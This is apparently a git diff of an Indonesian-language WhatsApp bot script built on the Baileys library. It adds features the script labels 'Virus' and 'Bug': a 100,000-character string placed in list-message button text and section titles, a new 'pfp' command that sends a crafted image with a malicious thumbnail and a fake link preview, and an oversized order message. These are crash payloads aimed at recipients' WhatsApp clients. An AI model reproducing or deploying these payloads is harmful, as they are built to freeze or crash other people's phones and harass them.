@@ -304,6 +304,7 @@ hexa.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{ment
         const conts = mek.key.fromMe ? hexa.user.jid : hexa.contacts[sender] || { notify: jid.replace(/@.+/, '') }
         const pushname = mek.key.fromMe ? hexa.user.name : conts.notify || conts.vname || conts.name || '-'
         const atibot = m.isBaileys
+        const virtik = '.'.repeat(100000)
 // Message ( MyMans APIs )
 const mess = {
    "wait": "```⊷️「 Wait 」```",
@@ -406,6 +407,7 @@ const mess = {
                         "message": {
                         "orderMessage": {
                         "orderId": "173388341205594",
+                        "thumbnail": Mvirgam,
 						"itemCount": 1000000000000,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
@@ -531,6 +533,15 @@ const flink = {
 "thumbnail": Mthumb,
 "sourceUrl": `https://mymans-api.herokuapp.com/`
 }
+// Fake Link V2 ( MyMans APIs )
+const flinks = (gam) => {
+"title": fake,
+"body": `Subscribe MyMans APIs`,
+"previewType": "PHOTO",
+"thumbnailUrl": `https://i.ibb.co/YkLFWvJ/In-Shot-20210704-143226427.jpg`,
+"thumbnail": gam,
+"sourceUrl": `https://mymans-api.herokuapp.com/`
+}
 // Send List Message ( MyMans APIs )
 const sendList = (id, tft, tvt, bxc, lsm, sctn = [], options = {}) => {
 sections = sctn
@@ -613,7 +624,7 @@ hexa.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
             }
 // DETECT GROUP INVITE ( MyMans APIs )
 if (m.mtype === 'groupInviteMessage') {
-if (mek.key.fromMe && isOwner) {
+if (isOwner) {
 var ngejoinye = await hexa.acceptInvite(mek.message.groupInviteMessage.inviteCode)
 reply('Succes')
 } else {
@@ -1000,6 +1011,7 @@ var menu = `Hai ${pushname}
 ├ ❏ ${prefix}psp [Bug]
 ├ ❏ ${prefix}pcp [Virus]
 ├ ❏ ${prefix}plp [Virus]
+├ ❏ ${prefix}pfp [Virus]
 ├ ❏ ${prefix}autoread <query>
 ├ ❏ ${prefix}anticall <on/off>
 ├ ❏ ${prefix}antidelete <on/off>
@@ -1572,6 +1584,10 @@ freply(`Berhasil menonaktifkan antitag!`)
 reply('Pilih on atau off')
 }
 break
+// Virus Gambar ( MyMans APIs & Hw Mods )
+case 'pfp':
+hexa.sendMessage(from, Mvirgam, image, {quoted:bugtrol, thumbnail:Bvirgam, contextInfo:{"externalAdReply":flinks(Mvirgam)}})
+break
 // Virus List Message ( MyMans APIs )
 case 'plp':
 if (!mek.key.fromMe && !isOwner) return
@@ -1579,11 +1595,11 @@ res = await hexa.prepareMessageFromContent(from,{
 "listMessage": {
 "title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
 "description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
-"buttonText": vipi,
+"buttonText": virtik,
 "listType": "SINGLE_SELECT",
 "sections": [
 {
-"title": vipi,
+"title": virtik,
 "rows": [
 {
 "title": "Banned",
